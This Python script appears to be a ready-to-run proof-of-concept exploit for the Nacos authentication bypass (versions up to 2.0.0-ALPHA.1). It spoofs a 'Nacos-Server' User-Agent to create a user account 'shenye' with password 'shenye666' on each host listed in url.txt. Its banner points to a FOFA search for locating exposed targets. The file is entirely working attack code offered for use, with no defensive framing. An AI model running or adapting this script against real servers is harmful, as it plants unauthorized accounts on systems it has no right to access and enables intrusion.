import requests
import sys
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
    print('+  \033[31mVersion: Nacos <= 2.0.0-ALPHA.1                                   \033[0m')
    print('+  \033[31mVersion: fofa：title="Nacos"                                       \033[0m')
    print('+  \033[31m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[31mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[31m  暂时不加入批量有能力的自己修改                                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/nacos/v1/auth/users"
    #vuln_url = target_url + "/v1/auth/users"
    headers = {
        "User-Agent": "Nacos-Server",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "username=shenye&password=shenye666"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/nacos/v1/auth/users \033[0m".format(target_url))
        if "create user ok!" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 \033[0m".format(target_url))
            print("\033[32m[o] 成功创建账户 shenye shenye666\033[0m")
        else:
            print("\033[31m[x] 创建用户请求失败 \033[0m")

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = i
            POC_1(target_url)

